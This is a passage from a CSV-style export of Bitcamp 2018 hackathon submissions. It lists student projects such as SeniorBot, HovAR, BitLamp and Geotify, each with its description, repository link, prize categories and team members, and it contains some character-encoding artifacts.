Where that  go has similarity between several different languages , an can be a fun language to keep up with. We also learned about how a jpg  is processed from something called huffman's encoding this allows the user to be able to condense information down and still be able to retain the most prominent portions of it .  

What's next for busten_fakes

I would say that trying to expand it do a sweet of things. Including reading an iinterrupting the meta-data and being capable of see whether there have been changes. Is allowing the user to look at more then one photo and letting them be capable of determining whether or not they agree with the service that we have provided. We are going to have to add in a either our own meta-data analysis tool or perhaps call another one from code that exist. 
",https://github.com/yuriprym/busten-fakes-,Best Digital Forensic Hack - Cipher Tech Solutions,No,,,
SeniorBot,http://bitcamp2018.devpost.com/submissions/92440-seniorbot,"Inspiration

Our parents are all overseas and mostly above 60s of age. Most of the time we would like to share multiple pictures through either emails or social media or share our thoughts about some new tech device. Currently, we would try to show our parents how to set up the accounts by calling them on the phone or in video calls. However, the explanatory process takes a lot of time and is quite confusing due to the multiple account setting-up steps and without visual description. This chatbot helps making the explanation process more time efficient and more intuitive to follow, therefore, narrowing the bridge between generations and promoting the up-to-date technical knowledge to senior citizens. 

What it does

The user types in questions or request to the Senior bot, our bot replies with lists of possible answers either in step-by-step of how to open an email account, or the bot gives a general description of the new technology given the input images uploaded by the user via the computer vision packages (Microsoft Azure). The bot also gives options for the user to talk directly to a real person by transferring the request to a near-by expert through a text. The user can locate the expert's location (Esri mapping GPS localization) and arrange the meeting to answer the user's questions

How we built it

We designed the platform using website development in Visual Studio ESP.NET with project overview and team member. 
The Senior bot is developed using the computer vision packages through Microsoft Azure. The mapping and 
localization were done in Arcgis developer Javascript API from Esri.

Challenges we ran into

The most challenges we got is to how to use high technology to remove technology's barrier to senior citizens. Throughout 36 hours, we had learned how to build a chatbot (able to correctly extract the user's need), integrate computer vision API to recognize high tech items for senior citizens and build a map to locate nearby technician experts for senior citizens.

Accomplishments that we're proud of

We accomplish a functioned platform using natural language processing and some new localization developer resources that we have never exposed before. 

What we learned

We learned to develop and integrate multiple language and API platforms together using Microsoft Azure 

What's next for SeniorBot

We will further train and develop our bot to extend its topics to other tasks such as booking flights, or expand to other new tech device searching. Moreover, we want to establish a connection database among the near-by experts so they can track each other schedules and marked down status of each case to speed up the helping process.
",https://github.com/ga12ece/seniorBot_Bitcamp18,"Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Accessibility Hack - Microsoft",No,HanhLe,,
DivCoin,http://bitcamp2018.devpost.com/submissions/92441-divcoin,"What it does

DivCoin allows users to trade stocks in a peer-to-peer fashion avoiding excess fees and unnecessary 3rd party interactions.

Challenges we ran into

Launching the blockchain and figuring out how the source code worked so that we could modify it for our specific need.

Accomplishments that we're proud of

Have a fully implemented blockchain application that is interacted with through a python interface.

What's next for DivCoin

The moon.
",,"Decentralise Everything: Blockchain challenge - Ark, Best Financial Hack - Capital One, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
Breadcrumbs,http://bitcamp2018.devpost.com/submissions/92448-breadcrumbs,"Inspiration

I always lose stuff

What it does

helps me know where I put things

How I built it

by sitting around waiting for neural networks to train

Challenges I ran into

neural network was difficult to train

Accomplishments that I'm proud of

trained a nn

What I learned

nn

What's next for Breadcrumbs

object recognition and better geospatial tracking
",https://github.com/naitian/BreadCrumbs,"Best Hack with Esri APIs and SDKs - Esri, Most Futuristic Hack - Paypal, Best Domain Name - Domain.com, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,andrewxiaoyu,edman124,wwll7
UNICOMP,http://bitcamp2018.devpost.com/submissions/92449-unicomp,"Inspiration--> Every High School graduate goes through the dilemma of College selection. Being a group of freshmen people, the college application process is still fresh in our minds. Thus, taking into account all the factors,we thought would be helpful for comparing two top choice colleges, we created UNICOMP, which basically is supposed to compare two given colleges and thus also provide the major determining factors to help students in their college selection process.

What it does--> Helps one choose between two colleges by comparing the data from the stored database.
How we built it--> We built it with some basic java code and very basic HTML5 code. By using the mentioned software.

Challenges we ran into--> Being freshmen, this was one of our first Hackathons and we had no prior experience in HTML5. Thus, we couldn't connect our HTML page to our java code. Lack of experience in JavaScript, added to the limitations of our project. Our program does run, and there is a HTML page for it, but we haven't been able to associate it with our java file.

Accomplishments that we're proud of--> Creating a web page from scratch and adding trust-able data through detailed research work.

What we learned--> Linking text file to the our program(back-end) and a very basic web page design using HTML5.

What's next for UNICOMP--> To increase the amount of stored data and improved code for a more efficient comparison. To create a complete functioning website with added features of College comparison represented in a better, and efficiently organized manner along with a 'best fit college' function, which would indicate the best fit college for the particular student.
",https://github.com/atharvakadam/UNICOMP,"Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,saagarwal13,,
HovAR,http://bitcamp2018.devpost.com/submissions/92452-hovar,"Inspiration

We were inspired to create the HovAR tricopter because of a little idea- how can we make augmented reality fit seamlessly- and usefully- into our lives? Disillusioned with bulky headsets and strapping phones to our heads, we wondered if there was a way to bring AR experiences directly into the real world.

What it does

HovAR is a custom-built tricopter with an onboard 130-lumen projector and 1080p camera that can project and interact directly with surfaces in the real world to create more seamless AR experiences. We created it to serve as a proof of concept for a potential new direction for AR.

How we built it

We built the HovAR tricopter by machining and 3d-printing our own parts for the frame, integrating to a lightweight, high-lumen projector, and adding a KK2 flight control board and a Raspberry Pi 3 for controls. We used a 4-cell LiPo battery to help account for the larger load.
We then developed a series of programs to demonstrate some possible applications of a HovAR-like UAV including a direct projection onto the ground for real-time directions, an overhead search-and-spotlight feature for finding lost items, and an interactive simulation with the projection.

Challenges we ran into

Some challenges we ran into were stabilizing the HovAR to get a steady image, providing power to all of our necessary components (including three motors, a raspberry pi, and a projector), and finding the space to securely house everything.
Another huge challenge was creating the AR experiences, and designing the operation of the HovAR to not only clearly demonstrate some of this system's capabilities, but also do so in a way that was safe for us on the other hackers at Bitcamp.

Accomplishments that we're proud of

We're super proud that we were able to build the drone from the ground up, and get the projection component to work. Some other things we're proud of is a modular frame with multiple projector configurations, and a responsive custom landing gear to mitigate prop-wash.

What we learned

We learned a ton about drone construction, CAD, and computer vision.

What's next for HovAR

Some minor changes would be investing in a better projector with a brighter, higher resolution display, improving the power configuration to reduce weight and improve battery life, and creating more custom housing components to clean up the physical look of the drone.

The biggest limitation in HovAR is that we can only squeeze out around a dozen minutes of continuous flight time, limiting it's feasibility for real world applications- for now. While HovAR is only intended as a proof of concept, we're hopeful that in the (near) future, we'll see AR drones flying around and changing the way we experience the world.
",https://github.com/traviho/drone-projector,"Most Futuristic Hack - Paypal, Best Use of AWS - Amazon Web Services, Best Philanthropic Hack - Bloomberg, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",Nope,PeterRyseck,,
Bitfolio for eko,http://bitcamp2018.devpost.com/submissions/92454-bitfolio-for-eko,"Inspiration

Our group noticed that sustainability for business practices is highly important for the future of our environment and wanted to make a service that makes people more conscious of their carbon footprint

What it does

eko is a web service that allows investors to search and analyze rankings and data on Fortune 500 companies' environmental impact

How I built it

As a UI/UX and graphic designer for the team, I first designed user flow experience through paper wire-frames by identifying crucial. I then prototyped a high fidelity interface with Adobe XD. I also created a brand identity, logo system, and custom graphic for eko with Adobe Illustrator.

Challenges I ran into

After our team used Python to scrap data from publicly available, we had trouble implementing it into our website. We resolved this issue by creating an html web page that takes data and displays it in a table. I then used CSS is stylize the page.

Accomplishments that I'm proud of

As my first hackathon, I am proud of meeting new people and forming a team to work on a project we were all interested in. As the team's designer, I took initiative in designing how users would interact with our product.

What I learned

I learn new ways for collaborating with teammates. From mentors, I also learned pitching ideas is dependent on addressing pressing problems in our society.

What's next for Bitfolio for eko

We are hoping to learn what people think at our demo session.
",,Best Designed Investor Education Product - Finra,No,,,
finabanana,http://bitcamp2018.devpost.com/submissions/92456-finabanana,"Inspiration

Inspired by the difficulties that college students face in managing their asset. As a college student themselves, they find that it's necessary to have a platform that manages their asset actively.

What it does

It links with the user financial institution(bank, funds, broker) to actively monitor and manage the user spending. It required the user to set a target saving and keep track of their spending. It will give the user score which potentially would give them better credit scores. It will also update the user to make sure they don't overspend their daily limit.

How we built it

As a UX competition, we only built a mock-up using Sketch. We use Invision to display the prototype.

Challenges we ran into

Design synchronization, color scheme, usability.

Accomplishments that we're proud of

User-friendly, potentially accommodate actual needs

What we learned

Material design, improve UX/UI design experience

What's next for finabanana

Start full stack development.
",https://invis.io/ZGGQJP5NHD6#/289882944_Start_Up_Flash_Page,Best Designed Investor Education Product - Finra,NO,,,
Inbox Analysis,http://bitcamp2018.devpost.com/submissions/92459-inbox-analysis,"Inspiration

As long as I stop checking my email inbox for a while, it will be flooded with all kinds of junk information: newsletters, subscriptions, notifications, etc. Even though I keep these kinds of subscription emails to the minimum, I still sometimes find it annoying when I receive constant email notifications about things I don't care about. Therefore, I want to find a way to identify these spam information and keep my inbox distraction-free.

What it does

This utility program can access your Gmail inbox via the Gmail API. It will keep track of the number of incoming and outgoing emails over a specific date interval and associate them with specific email addresses. You can decide whether you should filter or unsubscribe from a certain email address with the statistics. If someone is spamming you with more than 50 emails a month but you don't really care about it. Then it probably means you should stop him/her from adding distractions to your inbox.

How I built it

The program is built upon queries to the Google's Gmail API. I use PyQt5 to implement a very simple GUI on top it to display the data inside a spreadsheet with sorting functionalities.

Challenges I ran into

I was not very familiar with web programming, so I spent some time trying to understand the basics.

Accomplishments that I'm proud of

It helped me identified many unnecessary email sources and keeps the distractions in my email inbox to the minimum. It's also interesting to know my email history since the creation of my email account.

What I learned

how to do basic web and gui programming, and familiarity with python programming

What's next for Inbox Analysis

In the current implementation, the querying speed is super slow. It may take over twenty minutes to load the complete history of my inbox. I can implement a multithreaded querying to speed up the process. I also want to implement some linguistic analysis of emails' content to identify the repetitiveness of information. It may help me further reduce unnecessary emails.
",https://paste.ee/p/eMFMV#0NvfASkuKCGSBXWfZlahZpGHASqo6oc7,,No,,,
Augmented Reality Scavenger Hunt,http://bitcamp2018.devpost.com/submissions/92463-augmented-reality-scavenger-hunt,"Inspiration

.The simple game of treasure hunt played by every kid, should also reflect all the technological developments that have taken place. Incorporating such a change is the use of AR.

What it does

It provides 7 scaled pictures that need to be found by the user. Once they find the image, they can point the camera and voila! The AR projection comes to life!

How we built it

Our main platforms were unity and Android SDK. We incorporated the use of vuforia to create the target images and found 3D models that we could import into our project. 

Challenges we ran into

Our main challenge was the transmission of data once the image was found.Furthermore, downloading the 3D models resulted in the loss of textures, which had to be recovered.

Accomplishments that we're proud of

We've created an app with a complete user-interface and a clean AR projection that the user could hover around to learn more about the 3D object.

What we learned

Our main achievement is the integration of the user interface and the switching between each scene. We learned more 
C## commands in unity and also learned about debugging in Microsoft visual studio.

What's next for Augmented Reality Scavenger Hunt

To allow the user to upload the images such that their choice of projections can be created on target images of their choice. This is particularly advantageous for Businesses and parents seeking to improve knowledge about their company and teach their children important concepts respectively.
",,,,msidhu520,,
Furious George,http://bitcamp2018.devpost.com/submissions/92468-furious-george,"Inspiration:
Casey has an interest in embedded systems and decided to come to BitCamp with the idea to build something that represented a turret (as used in the military). Because of his interest in learning more about the C programming language, he has decided to explore the applications of what C can do with hardware. Noah also has a wide range of interest in software development and continues to explore new avenues of coding on an everyday basis.

How is it built?: 

B is for Bananas:
The name of the game is to try to take the banana from furious George. Unfortunately, George is constantly watching out for pesky humans who might want to steal his banana. As George's head moves around, try to avoid being seen by him and go for that banana. If George catches you in the act, he will shoot his laser at you and let out a horrid scream for all who dare to to take away his one true love. If you can manage to take the banana from George without him spotting you, you will win all of the glory and all of the banana! Just don't eat the banana, he might not forgive you for that... 
",,Most Unique Hack - 1517 Fund,,,,
Pluto,http://bitcamp2018.devpost.com/submissions/92469-pluto,"Inspiration

Apple is our muse.

What it does

Our webapp teaches how to invest in a fun and easy manner.

How we built it

We used JavaScript, HTML & CSS for the frontend and MongoDB Stitch for the backend.

Challenges we ran into

Working with AWS is pretty hard (Kevin or Sahil ------> Expand on this).

Accomplishments that we're proud of

We were able to build an Alexa skill and a fully functional webpage in this hackathon.

What we learned

It was our first time working with Alexa so it was pretty hard to make progress. Also, MongoDB made our life much easier.

What's next for Pluto

More functionalities for both the web app and the Alexa skill so as to increase accessibility.
",https://github.com/Meridiam/Pluto,"Best Designed Investor Education Product - Finra, Best Use of AWS - Amazon Web Services, Best Use of MongoDB Stitch - MongoDB, Best Accessibility Hack - Microsoft",No,mayenkar,,
Reflextion,http://bitcamp2018.devpost.com/submissions/92472-reflextion,"Inspiration:

Our inspiration was to create a means for people to step into the spotlight with their idols and learn to move as they do. To shake and pound it like a hip-hop master, to strike blows like an elite martial artist, and learn to dribble a basketball like an NBA baller. Reflextion allows someone to see how they match up to the best.  

What it does:

Currently, Reflextion has the capabilities of recording a video of someone wearing the Myo�� Gesture Control Armband and mapping the movements of the said person. The mapping data is currently stored locally, and when played back against a person wearing the Myo�� it will calculate how closely they match the movements and intensity of the person in the video.

Why we made it:

These functionalities were thought about for multi-use purposes. We designed a web application that would promote activity, a healthier lifestyle, and also be a fun and interactive way to learn new moves from athletes, artists and anyone from all over the world. We also designed this web application with the intention that a wide variety of activities would be covered such as weight-lifting form, yoga motions, and make the barriers for entry for these types of activities less daunting and more accessible for everyone as well as preventing injuries for a long-lasting active lifestyle. 

How we built it:

The initial step for our hack was to first and foremost mess around with the Myo�� band. This involved testing the capabilities and limitations of the product by coming up with test case motions and maneuvers and navigating through various applications to see its use.

After this test period, we figured out the configuration of the Myo�� and were able to extract the data from the device and interpret the results from the gyroscope, accelerometer and other measuring mechanisms. We then collected the data as JSON objects and then spent a good amount of time building the front end of the website application. We made it possible to record and upload videos that were then able to be used as mapping data to compare the user to the original video. Switching over to the backend, we managed to make the API that would receive the Myo�� data and then convert that data into a score of the user's performance to see how they compared to the model. 

Challenges we ran into:

Oh, boy was this a doozy. 

After a Friday of little to no productivity and two to three hours of shooting ideas until something hit, we decided to buckle down and start on our project. Sadly, the first idea that we agreed upon doing ended up being a bust as we were unable to differentiate our hack as much as we planned and thus after sinking five hours, we turned our gaze to a new frontier. 

Starting fresh in the wee hours of the morning, we began to work on Reflextion, and the hurdles to progress came frequent and fast. The initial issue was integrating a webcam service into our product since we were making a website application. Due to this dilemma, we had to resort to uploading videos instead of taking them directly on the website. Additionally, there was also an issue with storing our data in databases and utilizing MongoDB Stitch into our web application. 

Accomplishments that we're proud of:

We are proud that we managed to make an API that can receive the motion mapping data and return feedback as well as a score of the user�۪s performance. 

What we learned:

We learned how to make an API as well as how to develop a model by utilizing machine learning. 

What's next for Reflextion:

The next step for Reflextion is to introduce a means for the data that is currently stored locally to stored in a globally accessible database. This way anyone with a Myo�� would be able to access and learn how anyone from across the world performs in almost all water-free activities. 
Additionally, we want to incorporate multiple Myo��s so that users would be able to map all motions from the arms and legs to make it an incredibly comprehensive way to mimic motion. As well, we plan on making a mobile application for Reflextion.
",,"Most Futuristic Hack - Paypal, Best Domain Name - Domain.com, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",,acs3ss,AbhishekShinde,
Holey Moley!,http://bitcamp2018.devpost.com/submissions/92475-holey-moley,"Inspiration

We really wanted to put our skills to the limit this hackathon. We wanted to see if we could use image classification to identify potholes, send that information to the city, and assign that work onto a worker's phone.

What it does

It sends video feed from the front of the car to IBM Watson, then based on whether it's a pot hole or not, we move on and send the information to Esri. Then a use would be able to view all potholes and assign a task to their constituents.

How we built it

Using python, we take instant video, turn them into image frame that are sent into an image classification model. Then depending on degree of certainty, we send that data to Argcis, which allows all of that data to be displayed and manipulated. Then we created a client app which facilitates a service that allows them to ""complete the job"".
",,"Best Hack with Esri APIs and SDKs - Esri, Best use of SparkPost API - SparkPost, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Most Futuristic Hack - Paypal, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
BitLamp,http://bitcamp2018.devpost.com/submissions/92477-bitlamp,"Inspiration: It all started when we were working on a project where we were soldering ton of boards and moving all around the table for grabbing tools for designing the robot and adjusting the lamp for perfect brightness on the parts where we needed our focus. Hence we came up with the idea of developing the Lamp which follows your tools

What it does: It captures your tool on click of a button and follows where ever you move your tool.

How we built it: We designed and 3d Printed our custom made Lamp as per needs. We are using Raspberry-pi3 for all the computation, we developed our Tool Tracking program, which captures the given tool on a click of a pushbutton and finds the correlation between the object and all the following frames to track the object. Whenever tool reaches the end of frame(boundaries), our Bitlamp calculates the desired rotations needed on each arm/link of the 3DOF using inverse kinematics. Hence our Bitlamp illuminates the our needs

Challenges we ran into:


Reinforcing the 3D printed arms(very bad plastic being used for printing)
Code which runs smoothly on a laptop doesn't go along well on Raspberry pi3. 
Tracking exact tool with perfect background subtraction.
Calculation of Inverse Kinematics of 3 DOF arm


Accomplishments that we're proud of:


Cool custom lamp design
Perfect Object tracking 
Awesome use of all perception and modeling concepts learned in coursework


What we learned:


Time management 
Coffee works 
Debugging Raspberry pi3 programs
Object Detection using python and Open cv libraries
Configuring various interfaces and using text to speech feature well


What's next for BitLamp


An improved version of design with better stability [better material]
Voice Recognition.
Gesture Recognition.
Multiple Tools tracking

",https://github.com/mayankpathak10/Bit-Lamp,"Housing insights ���in-between�۝ Datasets - Fannie Mae, Best Designed Investor Education Product - Finra, Most Futuristic Hack - Paypal, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft, Most Unique Hack - 1517 Fund",Yes. Table number M11.,DarshanShah,,
FindMe,http://bitcamp2018.devpost.com/submissions/92478-findme,"Inspiration

ensuring drunk friends reach home safe

What it does

shares location with authorized contacts till you reach a pre-defined destination. You can schedule when and where to star location sharing and when and where to stop. 

How we built it

mongoDB-stitch, android studio

Challenges we ran into

getting user's location, integrating Esri maps into android application,integrating geo-fencing into esri maps.

Accomplishments that we're proud of

we could finally complete it in time for demos! (we had to discard our code for using Esri maps and start from scratch with Google Maps)

What we learned

not to underestimate your own stupidity and believe in Murphy's Law 

What's next for FindMe

most visited places, heat maps, history with friends, history visualization
",https://github.com/omi23vaidya/FindMe,"Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook",,omi23vaidya,karandalvi,
MyClimate,http://bitcamp2018.devpost.com/submissions/92480-myclimate,"Inspiration

After a long cold winter, we want to know when the warm weather is coming, and so we can go out and enjoy dates. When we use weather maps, Siri, and Google, it's really tiring to scroll down to the expected weather or Siri and Google do not remind as if our expected weather is coming. Now, here is MyClimate which solves those hassle.

What it does

The user needs to set his/her weather preferences and the app reminds the user if the same weather coming

How we built it

We used OpenWeatherMap API for the map and Java and SQLite in Android for notifications and weather evaluation.

Challenges we ran into

While creating the app, the two main problems we have are how to score the weather according to the user's input and remind the user when the same weather is coming.

Accomplishments that we're proud of

We could display the live-data weather map using openweathermap API, and we could make the hassle-free reminder app which notifies the user to plan ahead with the weather. 

What we learned

Creating a real-world problem solving app needs to go beyond the class lectures. 

What's next for MyClimate

We will add the speech recognition feature to be more hassle-free in user input and develop GUIs. 
",https://github.com/ssoemoe/myclimate,,No,DavidAhmed,VenkatPraveen,
BitCampUA,http://bitcamp2018.devpost.com/submissions/92483-bitcampua,"Inspiration

We wanted to create website that would help people of all ages learn and plan their financial future.

What it Does

It helps people gauge their financial literacy and help improve it. You can catch up on the latest financial news and the current markets as well as create and track your budget.

How we built it

We used Google's Firebase for our backend and MaterializeCSS for our Front-End.

Challenges we ran into

Getting a real time news feed working (cors issue).

Accomplishments that we're proud of

The website is responsive and dynamic. We got the front-end and back-end connected without a flaw.

What we learned

News aggregations is hard as well as getting dynamic stock and foreign market states.

What's next

Improving accessibility for all people as well as increasing the knowledge base to help and suit more people.
",https://github.com/silverstar085/BitCamp,"Best Designed Investor Education Product - Finra, Best Financial Hack - Capital One, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,Gandham96,neilshah19,
Porcupine,http://bitcamp2018.devpost.com/submissions/92485-porcupine,"Inspiration

I got the idea for this project in high school when I was coming up with web platform ideas to build. I never thought I'd actually pursue this idea.

What it does

Porcupine allows you to view and access a vast array of application code skeletons and templates.

How we built it

We built a frontend in Bootstrap and connected it to a MongoDB backend with Stitch. We were able to collaborate from separate computers using git.

Challenges we ran into

It was challenging learning how to use MongoDB Stitches instead of building a serverpiece (like we're used to). Once we found that out it was a matter of adjusting our designs to the functionality at hand.

Accomplishments that we're proud of

The database integration and our voting system.

What we learned

How to integrate a database and how a database is structured.
More about the git tool.

What's next for Porcupine

Linking the filesystem to Github.
",https://alugocp.github.io/porcupine,Best Use of MongoDB Stitch - MongoDB,No,,,
Immersive Atoms,http://bitcamp2018.devpost.com/submissions/92486-immersive-atoms,"Inspiration

Immersive Atoms is an artist collective at UMD focused on creating Art with Technology. We came to Bitcamp intent on shaking things up and challenging the norms of a hackathon.  Our work focused around four innovative mixed media projects which we then synthesized into a single composed work. 

What it does

At the core 3 have three Retro CRT Televisions, envisioned and painted by Elise Nichols, a Graphic Artist at UMD.

Aaman Mengis produced a video compilation of Juxtaposed Retro Cartoons such as Scooby Doo and Tom & Jerry.  Effect overlays and Timeline warping produce a eerie-nostalgic in accordance with the overall theme.

Elise Nichols produced a GIF playing with Vaporwave aesthetics and Retro Vibes. 

Eleonora Sadikova used Python to create procedurally generated graphics using random seeding and geometric relations. 

Bryce Peterson produced a sculpture entitled Moss Lung in conjunction with the project.  The work takes naturally harvested moss and draws upon animist philosophy to embody the plant with breath and spirit.  Watch mesmerized as the moss undulates and meditate in its solemnity.

How we built it

Bryce Peterson and Aaman Mengis hooked up Raspberry Pi's to the CRT's and used them to display original work produced by the group.

The Moss Lung sculpture was fabricated with moss harvested in the area.  Two bladders hold water, and water is pumped between them with a 12V DC Water Pump.  The Pump was controlled by a custom board with a MOSFET switching circuit and an Arduino. 

Eleonora used the turtle graphics library in Python for her animations. Elise used Adobe Illustrator to produce her GIF.  Aaman used Adobe Premiere to produce his video.

Challenges we ran into

Finding a way to output to the CRT's was challenging.  Once we realized that the Raspberry Pi has a Composite Port, it was much more feasible, however finding a 3.5mm to RCA cable was a challenge. Locating the hardware we needed in general was an ongoing challenge. Aaman had some issues with setting up his Raspberry Pi which ate up a lot of time. 

Fabricating the Moss Sculpture took a lot of creativity in sourcing materials.  Bryce literally used Whoopie Cushions as bladders, between which a 12V pump operated.  Water and dirt did get all over the place.  We could easily win _  Messiest Hack _.  

Accomplishments that we're proud of

Pulling together a Diverse team to create a unified piece of art was very satisfying and rewarding.  We felt like the craziest people at Bitcamp and that was a good thing.  We were proud to get our hands dirty and produce something as much for ourselves than any prize. 

What we learned

We learned how to hack an Old TV and use them in future projects. For some of us this was our First Hackathon, so we learned how much was can accomplish in a Sleep Deprived weekend when we're all truly invested. We learned how to write code in Python, and how to design a water pump system. We learned new lessons in how to just make it happen. 

What's next for Immersive Atoms

We are having a huge Exhibition April 26th-29 at Rm. 3306 Art Soc!!!  This piece will be in the show, along with other incredible Art x Tech work by UMD students.  As we move forward we are going to continue building this incredible community around the intersection of Art and Technology, and keep building and hacking together.
",,"Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund","Yes, Table V7",esadikova,,
Letter of Credit using BlockChain,http://bitcamp2018.devpost.com/submissions/92489-letter-of-credit-using-blockchain,"Using blockchain to streamline and fasten the process & eliminate the hassles involved in process of purchase, import/export and issuance of Letter of Credit.
",,"Decentralise Everything: Blockchain challenge - Ark, Best Financial Hack - Capital One",,,,
Geotify,http://bitcamp2018.devpost.com/submissions/92491-geotify,"Inspiration

Inspired by the Credible HealthCare Innovation Challenge, Geotify is a geofencing iOS9 application that tracks a user's location and sends warnings via SMS when the user enters or exits a ""trigger"" location.

What it does

Geotify collects a valid phone number, shows the user's current location, allows the user to pin ""geotifications"" (trigger regions and warning messages), and tracks the user's location in the background.

How we built it

Geotify's UI/UX interface was mainly built using Swift4 and the Alamofire module for an iOS9 platform. The backend server for Twilio communication to and from the phone was spun using Python3 and monitored via ngrok.

Challenges we ran into

It was a bit challenging to monitor constraints for the various UI assets, to implement SMS in the backend (not supported by Apple, hence the need for Twilio), and to connect interactions between the various controllers.

Accomplishments that we're proud of

The efficiency and simplicity of the design, the core functionality of geolocation tracking and geofencing, and SMS notifications via Twilio. Seeing as our team had little to no experience with any of the tools prior to Bitcamp 2018, it was amazing to watch our hard work and knowledge culminate in a functional product.

What we learned

We learned how to build an iOS9 mobile application from scratch, how to use Swift4, how to incorporate external modules via Cocoapod, how to connect communications between the backend and front-end in two separate programming languages via REST API calls, and how to improve team communication and collaboration.

What's next for Geotify

The next goal for Geotify would be to list all geotifications in a table view, to allow modification of a geotification, and to include a timer that tracks how long a user stays at a particular location

Acknowledgements

Much thanks to Bitcamp organizers, volunteers, mentors, and all sponsoring companies for all their efforts! Cheers to countless snacks and a double shot of coffee for keeping us sane throughout. Finally, shout to the ColorWar competitors for inspiring a rush of innovation and creativity.

Geotify Team (ToastCamp)

Favour Nerrise

Sanna Madan

Kyle Liu

Spencer Michalski
",https://github.com/kylefirst/Bitcamp-2018,"Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,,,
bitAlert,http://bitcamp2018.devpost.com/submissions/92492-bitalert,"Inspiration

Our inspiration was the lack of notification platforms for streamers streaming on twitch who were willing to accept Bitcoin. Our application attempts to ameliorate the blatant need for the decentralization of donations on platforms such as the streaming platforms twitch and mixer by allowing streamers to accept BTC without sacrificing the notification the would otherwise receive if sticking with Paypal. Moreover, our app allows streamers to use another avenue for accepting donations such as cryptocurrency seamlessly instead of relying on platforms such as Paypal which have very few restrictions against ""charge backs"": an occurrence all entertainers are all too familiar with on streaming platforms.

What it does

Our app sends the user or streamer a message through their email using the Sparkpost API with which they can then integrate into their live feed to acknowledge the sender and the amount of currency they have sent.

How I built it

We built the website/application by accessing the blockchain API and aggregating all of the transactions the user receives within a time frame and then determining their net gain and the sender of the funds- in order to provide relevant information to the user.

Challenges I ran into

Some challenges we ran into was the lack of documentation on the blockchain API and the lack of test cases.

Accomplishments that I'm proud of

We finished.

What I learned

Everything about blockchain, and how the technology actually functions.

What's next for bitAlert

We will probably facilitate the transference of BTC through our website one way or another.
",,"Decentralise Everything: Blockchain challenge - Ark, Best use of SparkPost API - SparkPost, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook",No.,owenluo,patrickcao,
The Irate Primate.,http://bitcamp2018.devpost.com/submissions/92493-the-irate-primate,"Inspiration: Casey has an interest in embedded systems and decided to come to BitCamp with the idea to build something that represented a turret (as used in the military). Because of his interest in learning more about the C programming language, he has decided to explore the applications of what C can do with hardware. Noah also has a wide range of interest in software development and continues to explore new avenues of coding on an everyday basis.

How is it built?:

B is for Bananas: The name of the game is to try to take the banana from furious George. Unfortunately, George is constantly watching out for pesky humans who might want to steal his banana. As George's head moves around, try to avoid being seen by him and go for that banana. If George catches you in the act, he will shoot his laser at you and let out a horrid scream for all who dare to to take away his one true love. If you can manage to take the banana from George without him spotting you, you will win all of the glory and all of the banana! Just don't eat the banana, he might not forgive you for that...
",,Most Unique Hack - 1517 Fund,,,,
Moochacho,http://bitcamp2018.devpost.com/submissions/92494-moochacho,"CURRENTLY AT TABLE H2

Inspiration

I run a media server with a decent amount of friends and family who use it. I wanted to find a way to publish when I get new media.

What it does

Uses the PlexPy API in combination with the IMDB API and the Sparkpost API to continually scan my library, keep track of any changes, and publish those changes once a week in a pretty format to all the users.

Challenges I ran into

Getting APIs to work

Accomplishments that I'm proud of

Managing to build a really nice looking email for subscribers - and have it all automated and sending out once  a week.

What I learned

Learned a lot about utilizing different APIs and chaining commands in order to efficiently get what I want - even if I have to draw from many different sources.

What's next for Moochacho

I plan to edit it some more, and actually roll it out into production.
",,"Best use of SparkPost API - SparkPost, Best Domain Name - Domain.com, Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
how_to_survive_a_hackathon,http://bitcamp2018.devpost.com/submissions/92495-how_to_survive_a_hackathon,"Inspiration

We wanted to make a game about the hackathon experience because it would be really meta

What it does

It's a simulation RPG about making a team and getting a project done over 36 hours

How I built it

Built from scratch and older games using Javascript and HTML5

Challenges I ran into

Fitting so many aspects of a hackathon into a small game in a small amount of time

Accomplishments that I'm proud of

Working with my friends to make a new game

What I learned

Don't get too ahead of yourself with ideas when making a game

What's next for how_to_survive_a_hackathon

More features and gameplay to incorporate from more hackathons we attend
",https://github.com/MasterMilkX/how_to_survive_a_hackathon,"Best Hack (be passionate) - Facebook, Most Unique Hack - 1517 Fund",,,,
FINFREE,http://bitcamp2018.devpost.com/submissions/92496-finfree,"Inspiration

Design an investor education product for a specific audience

What it does

FinFree is a mobile application that aims to educate and simulate a user�۪s financial situation with or without an investment. The app has an intuitive interface that follows a workflow that asks the required fields:


Age 
Salary 
Loans 
City 
Risk Appetite 
Amount he�۪s willing to invest


The application generates real-time a hypothetical savings and estimated years to be debt-free before and after he makes an investment. The app is smart to derive cost of living figures (tax, housing, food etc.) based on the city input and is also able to update calculations based on the indicated risk appetite.

Furthermore, a bar graph (savings across time) and pie graph (financial proportions) are generated to visualize the data. User�۪s can ���play�۝ with his data (What-ifs) and the projections and visualization are updating real-time to the latest set parameters. Lastly, the app also has educational data regarding various investments a user can make.
",https://medium.com/@vijitbhati/bitcamp-2018-finra-design-challenge-9bd6d862455e,Best Designed Investor Education Product - Finra,,,,
TravelBud,http://bitcamp2018.devpost.com/submissions/92497-travelbud,"TravelBud

